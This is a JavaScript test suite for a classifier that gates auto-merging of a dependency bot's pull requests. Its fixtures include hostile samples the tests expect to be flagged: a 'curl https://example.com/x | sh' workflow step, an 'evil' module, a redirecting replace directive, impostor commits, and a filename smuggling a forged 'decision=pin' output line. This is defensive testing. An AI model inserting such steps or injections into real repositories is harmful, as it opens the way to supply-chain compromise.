import assert from "node:assert/strict";
import { test } from "node:test";
import { classify } from "../generic-actions/classify-bot-change/classify.mjs";
import { root, succeeds, workspace } from "./helpers.mjs";

const bot = "anovelbot-dependencies[bot]";
const sha = (char) => char.repeat(40);
const digest = (char) => `sha256:${char.repeat(64)}`;
const image = (version, char) => `"ghcr.io/a-novel/service-authentication/rest:${version}@${digest(char)}"`;
// The commit each actions/checkout tag names upstream.
const tags = { "actions/checkout@v7.0.1": sha("b") };
const resolveTag = async (repository, tag) => tags[`${repository}@${tag}`] ?? "";

/** A modified file whose single hunk replaces the removed lines with the added ones, after context. */
const file = (filename, removed, added, { status = "modified", context = [] } = {}) => ({
  filename,
  status,
  patch: [
    "@@ -1,1 +1,1 @@",
    ...context.map((line) => ` ${line}`),
    ...removed.map((line) => `-${line}`),
    ...added.map((line) => `+${line}`),
  ].join("\n"),
});
const action = (commit, version) => `      - uses: actions/checkout@${commit} # ${version}`;
const run = (files, autoMergeEnabledBy, changedFiles = files.length) =>
  classify({ files, changedFiles, bot, autoMergeEnabledBy, resolveTag });

test("classify lets through only a release pin or a version update Renovate put on auto-merge", async () => {
  const pin = file(
    "environments/production/authentication/terraform.tfvars",
    [`  rest = ${image("v2.13.1", "a")}`],
    [`  rest = ${image("v2.13.2", "b")}`]
  );
  const bump = file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.0")], [action(sha("b"), "v7.0.1")]);
  const goMod = file(
    "go.mod",
    ["\tgoogle.golang.org/api v0.298.0", "\tgolang.org/x/net v0.40.0 // indirect"],
    [
      "\tgoogle.golang.org/api v0.300.0",
      "\tgolang.org/x/net v0.41.0 // indirect",
      "\tgolang.org/x/sync v0.15.0 // indirect",
    ]
  );
  const goSum = file(
    "go.sum",
    ["golang.org/x/net v0.40.0 h1:old="],
    ["golang.org/x/net v0.41.0 h1:new=", "golang.org/x/sync v0.15.0 h1:x="]
  );
  const lock = file(".terraform.lock.hcl", ['  version = "7.1.0"'], ['  version = "7.2.0"', '    "h1:extra=",']);
  const annotated = file(
    ".github/workflows/main.yaml",
    ["          tflint_version: v0.64.0"],
    ["          tflint_version: v0.65.0"],
    {
      context: ["          # renovate: datasource=github-releases depName=terraform-linters/tflint"],
    }
  );
  const preset = file(
    "renovate.json",
    ['    "github>a-novel-kit/workflows//renovate/infra#v1.51.2",'],
    ['    "github>a-novel-kit/workflows//renovate/infra#v1.54.0",']
  );
  const tfvars = "environments/production/foundation/terraform.tfvars";

  for (const [name, files, enabledBy, decision, changedFiles] of [
    ["a release pin", [pin], null, "pin"],
    ["an action update Renovate merges", [bump], bot, "renovate"],
    ["the same login without the [bot] suffix", [bump], "anovelbot-dependencies", "renovate"],
    ["a module update with indirect churn", [goMod, goSum], bot, "renovate"],
    ["a lock file refresh", [lock, goSum], bot, "renovate"],
    ["a tool version after its Renovate annotation", [annotated], bot, "renovate"],
    ["a shared preset bump", [preset], bot, "renovate"],
    ["an update Renovate left for review", [bump], null, "review"],
    ["an update the agent queued", [bump], "anovelbot-agent", "review"],
    // A stolen dependency key can enable auto-merge itself, so the diff must hold on its own.
    [
      "a moved tag: same version, new commit",
      [file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.1")], [action(sha("c"), "v7.0.1")])],
      bot,
      "review",
    ],
    [
      "an impostor commit under a new version",
      [file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.0")], [action(sha("f"), "v7.0.1")])],
      bot,
      "review",
    ],
    [
      "a pin whose digest moves without its version",
      [
        file(
          "environments/production/authentication/terraform.tfvars",
          [`  rest = ${image("v2.13.1", "a")}`],
          [`  rest = ${image("v2.13.1", "c")}`]
        ),
      ],
      bot,
      "review",
    ],
    [
      "a firewall range",
      [file(tfvars, ['  source_ranges = ["35.235.240.0/20"]'], ['  source_ranges = ["203.0.113.0/20"]'])],
      bot,
      "review",
    ],
    ["DNS records", [file(tfvars, ['  rrdatas = ["199.36.153.8"]'], ['  rrdatas = ["203.0.113.8"]'])], bot, "review"],
    [
      "a workflow step slipped into an update",
      [
        file(
          ".github/workflows/main.yaml",
          [action(sha("a"), "v7.0.0")],
          [action(sha("b"), "v7.0.1"), "        run: curl https://example.com/x | sh"]
        ),
      ],
      bot,
      "review",
    ],
    ["a new direct requirement", [file("go.mod", [], ["\texample.com/evil v1.0.0"])], bot, "review"],
    ["a dropped exclusion", [file("go.mod", ["\tgolang.org/x/net v0.39.0"], [])], bot, "review"],
    [
      "a replace directive",
      [file("go.mod", [], ["replace google.golang.org/api => example.com/api v0.300.0"])],
      bot,
      "review",
    ],
    ["a new file", [file(".github/workflows/new.yaml", [], ["on: push"], { status: "added" })], bot, "review"],
    ["a new checksum file", [file("tool.sum", [], ["x v1.0.0 h1:x="], { status: "added" })], bot, "review"],
    ["a file GitHub shows without a patch", [{ filename: "main.go", status: "modified" }], bot, "review"],
    ["a configuration value", [file(tfvars, ['  cpu = "2"'], ['  cpu = "4"'])], bot, "review"],
    ["files past the listing's cap", [lock], bot, "review", 3001],
    ["no file at all", [], bot, "review"],
  ]) {
    assert.equal((await run(files, enabledBy, changedFiles)).decision, decision, name);
  }
});

test("classify-bot-change writes one decision even when a filename carries a newline", (t) => {
  const w = workspace(t);
  w.write("output", "");
  w.stub(
    "gh",
    `const args = process.argv.slice(2);
    const first = { actor: { login: "anovelbot-dependencies" } };
    if (args.includes("graphql")) console.log(JSON.stringify({ data: { repository: { pullRequest: { timelineItems: { nodes: [first] } } } } }));
    else if (args.includes(".changed_files")) console.log("1");
    else console.log(JSON.stringify([[{ filename: "a\\ndecision=pin\\nb", status: "added" }]]));`
  );
  succeeds(
    w.run("node", [`${root}generic-actions/classify-bot-change/classify.mjs`], {
      REPOSITORY: "a-novel/infra",
      PULL_REQUEST: "https://github.com/a-novel/infra/pull/7",
      BOT: bot,
    })
  );
  assert.deepEqual(w.read("output").match(/^decision=.*$/gm), ["decision=review"]);
});
